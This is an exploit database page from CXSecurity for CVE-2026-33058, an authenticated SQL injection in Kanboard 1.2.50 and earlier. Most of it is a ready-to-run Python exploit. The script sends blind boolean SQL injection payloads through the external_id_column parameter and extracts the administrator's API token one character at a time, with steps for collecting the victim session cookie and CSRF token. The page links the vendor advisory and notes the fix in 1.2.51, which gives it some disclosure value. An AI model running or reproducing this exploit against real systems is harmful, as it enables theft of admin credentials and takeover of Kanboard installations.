---
title: Kanboard < = 1.2.50 Authenticated SQL Injection
url: https://cxsecurity.com/issue/WLB-2026030027
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-18
fetch_date: 2026-03-19T04:14:42.884835
---

# Kanboard < = 1.2.50 Authenticated SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Kanboard <= 1.2.50 Authenticated SQL Injection**  **2026.03.18**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-33058](https://cxsecurity.com/cveshow/CVE-2026-33058/ "Click to see CVE-2026-33058")**  CWE: **[CWE-89 (Improper Neutralization of Special Elements used in an SQL Command (&#039;SQL Injection&#039;))](https://cxsecurity.com/cwe/CWE-89%20%28Improper%20Neutralization%20of%20Special%20Elements%20used%20in%20an%20SQL%20Command%20%28%26#039;SQL Injection&#039;)) "Click to see CWE-89 (Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'))")** | |

#!/usr/bin/env python3
# Exploit Title: Kanboard Authenticated SQL Injection in ProjectPermissionController
# CVE: CVE-2026-33058
# Date: 2026-03-18
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://kanboard.org
# Software Link: https://github.com/kanboard/kanboard
# Affected: Kanboard <= 1.2.50
# Tested on: Kanboard 1.2.50 (SQLite)
# Category: Webapps
# Platform: PHP
# Exploit Type: Remote
# CVSS: 8.8 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
# Description: Authenticated SQL injection via external\_id\_column parameter when adding a user to a project.
# Allows extraction of sensitive data (API tokens, password hashes, emails, etc.)
# Fixed in: 1.2.51
# Usage:
# python3 exploit.py <base\_url> <project\_id> <KB\_SID> <csrf\_token>
#
# Examples:
# python3 exploit.py http://kanboard.local 1 abc123xyz CSRF-abcdef1234567890
#
# Options:
# --
#
# Notes:
# • Requires valid authenticated session and CSRF token
# • Targets admin API token by default (blind boolean-based)
# • Adjust success condition in send\_injection() if needed
#
# How to Use
#
# Step 1: Log in to Kanboard with an account that has permission to add users to a project
#
# Step 2: Open browser dev tools → Network tab → go to project permissions page → copy:
# • KB\_SID cookie value
# • csrf\_token value from the form (or from any POST request)
#
# Step 3: Run the script with the collected values
#
import sys
import requests
import string
import time
BASE\_URL = sys.argv[1].rstrip('/')
PROJECT\_ID = sys.argv[2]
KB\_SID = sys.argv[3]
CSRF\_TOKEN = sys.argv[4]
COOKIES = {
"KB\_SID": KB\_SID,
}
HEADERS = {
"Content-Type": "application/x-www-form-urlencoded",
"Referer": f"{BASE\_URL}/project/{PROJECT\_ID}/permissions"
}
def send\_injection(payload):
data = {
"csrf\_token": CSRF\_TOKEN,
"user\_id": "",
"username": "testinj",
"external\_id": "dummy",
"external\_id\_column": payload,
"name": "Test Injection",
"role": "project-member"
}
r = requests.post(
f"{BASE\_URL}/?controller=ProjectPermissionController&action=addUser&project\_id={PROJECT\_ID}",
data=data,
cookies=COOKIES,
headers=HEADERS,
allow\_redirects=False
)
return "error" not in r.text.lower() and r.status\_code == 302
def bool\_query(condition):
payload = f"id) OR (SELECT CASE WHEN ({condition}) THEN 1 ELSE (SELECT 1 WHERE 0) END FROM users WHERE role='app-admin' LIMIT 1) -- "
return send\_injection(payload)
def extract\_admin\_api\_token():
token = ""
charset = string.ascii\_letters + string.digits + "-\_"
print("[\*] Extracting admin API token (blind boolean)...")
for pos in range(1, 41):
found = False
for c in charset:
condition = f"substr((SELECT api\_access\_token FROM users WHERE role='app-admin' LIMIT 1),{pos},1)='{c}'"
if bool\_query(condition):
token += c
print(f"[+] Position {pos}: {c} → {token}")
found = True
break
time.sleep(0.3)
if not found:
print(f"[+] Token extraction finished: {token}")
break
return token
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) != 5:
print("Usage: python3 exploit.py <base\_url> <project\_id> <KB\_SID> <csrf\_token>")
sys.exit(1)
extracted = extract\_admin\_api\_token()
if extracted:
print(f"\n[!] Extracted admin API token: {extracted}")
print("You can now use this token for full API access as admin.")

**##### References:**

Official advisory:

https://github.com/kanboard/kanboard/security/advisories/GHSA-f62r-m4mr-2xhh

Vendor homepage:

https://kanboard.org

Software repository:

https://github.com/kanboard/kanboard

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030027)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top